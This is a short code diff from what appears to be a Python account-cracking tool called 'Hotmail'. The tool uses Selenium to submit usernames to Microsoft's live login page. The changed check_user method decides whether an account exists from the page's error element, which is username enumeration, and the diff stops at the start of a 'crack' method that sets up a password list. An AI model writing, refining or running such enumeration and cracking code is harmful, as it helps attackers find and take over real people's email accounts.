@@ -18,21 +18,20 @@ class Hotmail:
 
     def check_user(self):
         self.browser.driver.get('https://login.live.com/login.srf')
-        input = self.browser.driver.find_element_by_name('loginfmt')
-        #input = self.browser.driver.find_element_by_id('i0116')
+        input = self.browser.wait_until_element_exists('name','loginfmt')
         input.clear()
         input.send_keys(self.username)
         self.browser.driver.find_element_by_id('idSIButton9').click()
         try:
-            self.browser.driver.find_element_by_name('passwd')
-            return True
-        except NoSuchElementException:
+            self.browser.wait_until_element_exists('id', 'usernameError')
             return False
+        except NoSuchElementException:
+            return True
         #try:
-        #    self.browser.wait_until_element_exists('id', 'usernameError')
-        #    return False
-        #except NoSuchElementException:
+        #    self.browser.driver.find_element_by_name('passwd')
         #    return True
+        #except NoSuchElementException:
+        #    return False
 
     def crack(self):
         passwords = []
